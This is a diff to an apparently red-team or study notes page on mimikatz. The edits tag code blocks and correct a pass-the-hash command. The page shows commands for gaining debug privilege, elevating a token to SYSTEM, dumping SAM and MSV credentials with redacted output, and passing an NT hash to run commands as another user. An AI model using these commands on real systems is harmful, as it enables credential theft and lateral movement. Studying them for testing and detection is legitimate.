@@ -14,7 +14,7 @@
 
 * Required to perform actions such as `lsadump::sam` later on
 
-```
+```batch
 mimikatz # privilege::debug
 Privilege '20' OK
 ```
@@ -27,7 +27,7 @@ Privilege '20' OK
 
 {% embed url="https://docs.velociraptor.app/artifact_references/pages/windows.detection.impersonation/" %}
 
-```
+```batch
 mimikatza # token::elevate
 
 Token Id  : 0
@@ -45,7 +45,7 @@ SID name  : NT AUTHORITY\SYSTEM
 
 `lsadump::sam`
 
-```
+```batch
 mimikatz # lsadump::sam
 Domain : xxxx
 SysKey : xxxx
@@ -64,7 +64,7 @@ User : Administrator
 
 `lsadump::msv`
 
-```
+```batch
 mimikatz # lsadump::msv
 
 Authentication Id : 0 ; xxxx (00000000:0004b39c)
@@ -96,18 +96,18 @@ mimikatz # token::revert
 `sekurlsa::pth`
 
 {% code overflow="wrap" %}
-```
-mimikatz # /user:<username> /domain:<domain> /ntlm:<nt_hash> /run:"<command_to_run>"
+```batch
+mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<nt_hash> /run:"<command_to_run>"
 ```
 {% endcode %}
 
-`/user` : username to impersonate
+a. `/user` : username to impersonate
 
-`/domain` : fully qualified domain name
+b. `/domain` : fully qualified domain name
 
-`/ntlm` : NT hash
+c. `/ntlm` : NT hash
 
-`/run` : command to run
+d. `/run` : command to run
 
 * according to The Hacker Tools (refer link in "Resources" above), it defaults to `cmd.exe`&#x20;
 
